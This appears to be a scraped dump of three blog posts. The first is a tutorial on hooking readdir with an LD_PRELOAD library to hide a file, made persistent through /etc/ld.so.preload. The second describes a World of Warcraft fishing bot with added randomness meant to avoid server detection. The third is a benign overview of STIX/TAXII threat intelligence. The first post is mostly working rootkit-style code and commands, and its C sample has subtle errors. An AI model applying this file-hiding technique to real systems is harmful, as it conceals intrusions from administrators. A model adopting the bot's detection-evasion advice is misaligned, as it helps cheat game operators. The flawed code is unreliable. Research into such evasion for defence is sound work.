        "content": "Overview Recently I heard about a new malware called Symbiote , which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\nHijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD? What is a Shared Library? Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I\u0026rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I\u0026rsquo;ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long // as the pointer that readdir returns isn\u0026#39;t null and the errno != 0 if (next) { if (! file_ignored (next-\u0026gt;d_name)) // we can see here that it the filename is // taken from the next variable, lets look through the source code of `readdir` { ... Let\u0026rsquo;s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \u0026#34;readdir\u0026#34; U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page . The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include \u0026lt;dirent.h\u0026gt; struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ }; ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\nAlright, let\u0026rsquo;s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c #define _GNU_SOURCE #include \u0026lt;dirent.h\u0026gt; // Including the Directory Entry structure // The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html // Search for RTLD_NEXT, basically it allow us to wrap // the original function handle = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;) struct dirent *dp; // Iterating over the return values of our original `readdir` while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u0026gt;d_name`) // break the loop and go to the next entry, essentially skipping our file. if(strstr(dp-\u0026gt;d_name, \u0026#34;syl.lys\u0026#34;) == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let\u0026rsquo;s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\nfPIC -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD What is LD_PRELOAD? I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won\u0026rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won\u0026rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c\u0026rsquo;mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \u0026#34;/lib/libhidemyfile.so\u0026#34; \u0026gt; /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let\u0026rsquo;s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u0026lt;--- Here it is! libselinux.so.1 =\u0026gt; /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u0026gt; /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u0026gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I\u0026rsquo;ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to \u0026ldquo;completely\u0026rdquo; hide it from the system because now if we cat it despite not \u0026ldquo;reading\u0026rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code Resources This post wouldn\u0026rsquo;t be possible without:\nhttps://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/ https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf https://attack.mitre.org/techniques/T1574/006/ https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://blog.jessfraz.com/post/ld_preload/ ",

        "tags": ["World of Warcraft","Game Bot","Windows API","python",],
        "content": "This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot Overview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).\nThe bot is running on the currently Active Window, I haven\u0026rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.\nMetrics Zereth Mortis: 29m 33s Items Looted: 161 That means that we loot roughly about ~5.4 fish per minute.\nInstallation \u0026amp; Usage Check the requirements.txt, for the Python Requirements and install them via pip install -r requirements.txt. The tests are done under Python3.10 however I believe everything should work with Python\u0026gt;=3.6.\nSet the bait Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.\nSave the image and place it at the root of the script as bait.png, additionally you can adjust the variable BAIT_IMAGE in the `fishingbot.py.\n⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.\nFine-tune the script The fine tunning that you have to do consists of:\nFISHING_BUTTON = \u0026#34;b\u0026#34; TUNE_BAIT_MOUSE_UNDER_PX = 35 EDGE_RESET = 10, 10 ACTIVE_AFTER = 2 CONFIDENCE = 0.7 Variable Description FISHING_BUTTON The button that you use for fishing, in my case it was b TUNE_BAIT_MOUSE_UNDER_PX The offset pixels where the mouse is going to be whenever there is a bait, see the How it works? section EDGE_RESET Those are the x, y coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at 10, 10 ACTIVE_AFTER The bot simply waits 2 secs before it starts CONFIDENCE The confidence of the template matching How it works? The method is extremely simple, it utilizes two things. The first one is the Template Matching , this is what pyautogui.locateOnScreen uses under the hood and the second one is the PyGetCursorInfo function which is exposed by the win32gui lib.\nThe solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the GetCursorInfo to catch the change of the cursor and if it becomes a different tuple from the default one which we set when there is nothing active on our cursor. Then we execute the click.\nNow about the fine-tuning, look at this example\nThe TUNE_BAIT_MOUSE_UNDER_PX variable which doesn\u0026rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.\nEdge cases There is a rare edge case when the default tuple for the cursor doesn\u0026rsquo;t change which happens if the script isn\u0026rsquo;t tune right, I\u0026rsquo;ve solved this by resetting the cursor at x=10, y=10 position of the screen and then bringing it back. In a case when the cursor\u0026rsquo;s icon doesn\u0026rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.\nAdditional features I\u0026rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.\n",

        "content": "Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example The data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX. All the list of the examples you can find in their official example page .\nTAXII The STIX data has to be relayed in some way, that\u0026rsquo;s why we have the TAXII Server. It is a simple web server specifically created for storing and sharing that kind of data.\nTAXII 1.x Structure The TAXII 1.2 Server has the following structure:\nDiscovery Service - Within a POST request to their discovery URL (which should be pointed by the Server maintainers). Collection Management URL - The service that has the collections with STIX objects. Channels - Push/Subscribe pattern. The full list of features for TAXII1 can be found in their official documentation:\nhttps://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf https://www.oasis-open.org/committees/download.php/57324/OASIS TAXII 2.x Structure For the newer versions of the TAXII Server we have the following structure:\n/discovery - Discovers the paths to the different services provided by the Server. api_roots - Provides the API URLs for the different types of Collection Management. collections - Provides the available collections for the given api_root. collection/objects - Provides a list of STIX Objects in a given collection You can see that this is very similar to the TAXII 1.x servers, there isn\u0026rsquo;t much of a difference in the structure besides that the collection_management_url is api_root in TAXII 2.x.\nThe full list of features for TAXII2 can be found in their official documentation .\nTAXII Servers and Threat Intelligence Providers The information about this is very scarce so I\u0026rsquo;ve gathered a quick list of the known providers for STIX data.\nResource URL Description Data Type AlienVault OTX https://otx.alienvault.com/api Requires an account, provides data in various ways including a TAXII Server. STIX 1.x Threat Connect https://threatconnect.com/stix-taxii/ Requires an account, Paid service, (consumes and provides) threat intel. STIX 1.x/2.x EcleticIQ https://www.taxiistand.com/ Test TAXII (v1x) server. (quite unstable and inconsistent) STIX 1.x Limo - Anomali https://www.anomali.com/resources/limo Test TAXII (v1x/v2x) server. Somewhat unstable but mostly fine during tests. STIX 1.x/2.x Tools for STIX/TAXII The main tool for creating/parsing or generating STIX data is going to be Python, since that all of the tools created are written in Python. Of course there are other alternatives but currently that\u0026rsquo;s the most common one.\nOther tools that might come in handy.\nTool Description Version stix-shifter Translates STIX to various other Threat Intelligence formats such as Carbon Black Cloud Query and others STIX 1.x/2.x stix2 The main python package to parse and use/create STIX2 data. STIX 2.x stix2-validator Provides a validation for the STIX2 data, can be used to validate your data from your sources. STIX 2.x stix2-slider Transforms STIX2 content to STIX1.2 STIX 2.x stix2-elevator Transforms STIX1 data to STIX2.x STIX 1.x stix The main python package for STIX1 data. STIX 1.x stix-validator Validating STIX1 data. STIX 1.x stix2-patterns Validator and Pattern Parser for STIX 2.x Patterns STIX 2.x taxii2-client Python Client for TAXII 2 Servers TAXII 2.x cabby Python Client for TAXII 1 Servers TAXII 1.x Snippets and Gists https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d (Creating a TAXII2 Client for LimoAnomali) https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858 (Creating a TAXII1 Client for OTXAlienVault) ",
